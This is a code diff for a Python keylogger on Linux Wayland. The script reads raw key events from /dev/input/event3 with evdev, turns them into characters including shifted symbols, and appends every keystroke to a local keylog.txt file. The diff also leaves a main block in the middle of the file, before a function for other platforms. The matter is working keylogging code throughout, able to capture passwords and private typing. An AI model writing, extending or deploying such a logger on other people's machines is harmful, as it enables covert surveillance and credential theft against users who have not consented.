@@ -3,78 +3,104 @@ import os
 import sys
 from datetime import datetime
 
+import evdev
+from datetime import datetime
+
 LOG_FILE = "keylog.txt"
 WAYLAND_KEYBOARD_DEVICE = '/dev/input/event3'
 log_buffer = ""
+is_shift_pressed = False
+
+shift_map = {
+    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
+    '`': '~'
+}
+
+normal_map = {
+    'GRAVE': '`', 'MINUS': '-', 'EQUAL': '=', 'LEFTBRACE': '[', 'RIGHTBRACE': ']', 'BACKSLASH': '\\',
+    'SEMICOLON': ';', 'APOSTROPHE': "'", 'COMMA': ',', 'DOT': '.', 'SLASH': '/', 'SPACE': ' ', 'ENTER': '\n', 'TAB': '\t'
+}
 
 def write_buffer_to_file():
-    """Writes the current buffer to file and clears it"""
     global log_buffer
     if log_buffer:
         with open(LOG_FILE, "a") as f:
             f.write(log_buffer)
         log_buffer = ""
 
-def log_to_file(message):
-    """Writes a message to the log file."""
-    with open(LOG_FILE, "a") as f:
-        f.write(message)
-
 def append_to_log(char):
-    """Adds char to buffer. Flushes to file on Space or Enter."""
     global log_buffer
     print(char, end="", flush=True)
     log_buffer += char
     if char == " " or char == "\n":
         write_buffer_to_file()
 
-def clean_evdev_key(event_code):
-    """Converts 'KEY_A' to 'a' and handles special keys"""
+def process_key(event_code):
+    """
+    Translates raw evdev codes into characters, respecting Shift state.
+    """
+    global is_shift_pressed
     key = event_code.replace("KEY_", "")
-    if len(key) == 1:
-        return key.lower()
-    if key == "SPACE": return " "
-    if key == "ENTER": return "\n"
-    if key == "DOT": return "."
-    if key == "COMMA": return ","
-    if key == "BACKSPACE": return "[BSP]"
-    if key == "LEFTSHIFT" or key == "RIGHTSHIFT": return ""
+    if key in ("LEFTSHIFT", "RIGHTSHIFT"):
+        return None
+    if key == "BACKSPACE":
+        return "[BSP]"
+    if key == "CAPSLOCK":
+        return "[CAPS]"
+    char = ""
 
-    return f"[{key}]"
+    if key in normal_map:
+        char = normal_map[key]
+    elif len(key) == 1:
+        char = key.lower()
+    else:
+        return f"[{key}]"
+
+    if is_shift_pressed:
+        if char.isalpha():
+            return char.upper()
+        if char in shift_map:
+            return shift_map[char]
+
+    return char
 
 def run_evdev_mode():
-    """Logic for Linux Wayland (Arch default) using evdev"""
-    print(f"[*] Mode: WAYLAND (Kernel Level). Trying to hook {WAYLAND_KEYBOARD_DEVICE}...")
-
-    try:
-        import evdev
-    except ImportError:
-        print("\n[!] ERROR: 'evdev' library missing.")
-        print("    Run: sudo pacman -S python-evdev")
-        return
+    global is_shift_pressed
+    print(f"[*] Mode: WAYLAND (Kernel Level). Hooking {WAYLAND_KEYBOARD_DEVICE}...")
 
     try:
         device = evdev.InputDevice(WAYLAND_KEYBOARD_DEVICE)
         print(f"[*] Success! Listening on: {device.name}")
         print("[*] Press CTRL+C to stop.")
-
-        log_to_file(f"\n--- Started evdev logging on {device.name} at {datetime.now()} ---\n")
+        with open(LOG_FILE, "a") as f:
+            f.write(f"\n--- Started logging at {datetime.now()} ---\n")
 
         for event in device.read_loop():
-            if event.type == evdev.ecodes.EV_KEY and event.value == 1:
+            if event.type == evdev.ecodes.EV_KEY:
                 raw_key = evdev.ecodes.KEY[event.code]
-                clean_char = clean_evdev_key(raw_key)
+                if raw_key in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
+                    is_shift_pressed = (event.value == 1)
+                    continue
+                if event.value == 1:
+                    char = process_key(raw_key)
+                    if char:
+                        append_to_log(char)
 
-                if clean_char:
-                    append_to_log(clean_char)
+    except KeyboardInterrupt:
+        print("\n[*] Stopping... Saving remaining data.")
+        write_buffer_to_file()
+        print(f"[*] Done. Data saved to {LOG_FILE}")
 
     except FileNotFoundError:
         print(f"\n[!] ERROR: Device '{WAYLAND_KEYBOARD_DEVICE}' not found.")
-        print("    Run 'sudo ls /dev/input/' to see available devices.")
     except PermissionError:
-        print(f"\n[!] ERROR: Permission denied accessing {WAYLAND_KEYBOARD_DEVICE}.")
-        print("    YOU MUST RUN THIS SCRIPT WITH 'sudo' ON ARCH.")
+        print(f"\n[!] ERROR: Permission denied. Run with 'sudo'.")
+    except OSError as e:
+        print(f"\n[!] OS Error: {e}")
 
+if __name__ == "__main__":
+    run_evdev_mode()
 def run_pynput_mode():
     """Logic for X11 / Windows / macOS using pynput"""
     print("[*] Mode: STANDARD (X11/Windows). Hooking global input...")
